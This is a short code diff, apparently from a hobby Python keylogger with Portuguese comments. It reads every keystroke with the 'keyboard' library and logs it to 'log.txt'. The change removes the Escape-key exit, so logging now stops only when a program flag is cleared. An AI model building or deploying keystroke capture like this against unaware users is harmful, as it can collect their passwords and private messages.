@@ -47,9 +47,11 @@ def loop_registro():
     global registrando
     while registrando:
         tecla = keyboard.read_event(suppress=False) # Criando um objeto 'tecla' que vai ser utilizado para conter os names das teclas (atributo referente ao nome de uma tecla)
+        
+        if not registrando:
+            break
+
         if tecla.event_type == keyboard.KEY_DOWN: # Captura as teclas apenas quando digitadas
-            if tecla.name == 'esc': # Quebra do loop infinito ao pressionar a tecla 'esc'
-                break
             registrar_tecla(tecla) # Execução da função de registrar as teclas, utilizando os atributos salvos no objeto 'tecla' para decidir como cada tecla deve ser salva no arquivo 'log.txt'
 
 def gerar_arquivo_logs():
